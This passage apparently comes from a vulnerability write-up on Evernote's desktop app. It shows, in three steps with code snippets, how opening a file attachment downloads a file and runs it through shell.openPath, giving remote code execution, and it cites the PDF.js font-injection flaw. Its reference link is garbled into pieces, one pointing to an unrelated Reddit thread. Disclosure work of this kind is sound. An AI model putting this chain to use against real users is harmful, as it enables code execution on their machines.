  1. `Mt.register("boron.actions.openFileAttachment"` receive `Mt.call(a, s);` signal

  2. Triggered `await cv({ filePath: a, resource: e, noteGuid: n, appName: r });` `'sync'` (download) attachment at the same-time

  3. `s.shell.openPath(e);` Executed *`'sync'` (download) malicious script-file, `RCE`

### References

  1. `PDF.js`: Font-Injecting referenced [h](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/)[ttps://codeanlabs.](https://www.reddit.com/r/Evernote/comments/18es5f5/how_many_people_pay_for_evernote_in_2023/)[com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/)
